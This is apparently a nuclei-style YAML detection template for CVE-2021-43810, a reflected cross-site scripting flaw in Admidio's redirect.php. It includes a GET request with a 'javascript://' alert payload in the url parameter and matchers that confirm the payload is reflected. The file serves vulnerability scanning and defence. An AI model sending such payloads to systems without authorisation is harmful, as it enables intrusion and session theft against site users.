id: CVE-2021-43810

info:
  name: Admidio - Cross-Site Scripting
  author: gy741
  severity: medium
  description: A cross-site scripting vulnerability is present in Admidio prior to version 4.0.12. The reflected cross-site scripting vulnerability occurs because redirect.php does not properly validate the value of the url parameter. Through this vulnerability, an attacker is capable to execute malicious scripts.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: Upgrade to version 4.0.12 or later.
  reference:
    - https://github.com/Admidio/admidio/security/advisories/GHSA-3qgf-qgc3-42hh
    - https://nvd.nist.gov/vuln/detail/CVE-2021-43810
    - https://github.com/Admidio/admidio/commit/fcb0609abc1d2f65bc1377866bd678e5d891404b
    - https://github.com/Admidio/admidio/commit/c043267d362f7813543cc2785119bf3e3e54fe21
    - https://github.com/Admidio/admidio/releases/tag/v4.0.12
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-43810
    cwe-id: CWE-79
    epss-score: 0.67373
    epss-percentile: 0.98489
    cpe: cpe:2.3:a:admidio:admidio:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: admidio
    product: admidio
  tags: cve2021,cve,admidio,xss,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'please click <a href="javascript://%0aalert(document.domain)" target="_self">'

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a004730450221009101d9bcf4627cbbaad74ac39f1daae24f86c5dc6f0c09c64cc12685ae5fe9c2022047f590154785414fbc1e31022c69f7a0233d18c186a6fcab9a6425c1ba1f63f8:922c64590222798bb761d5b6d8e72950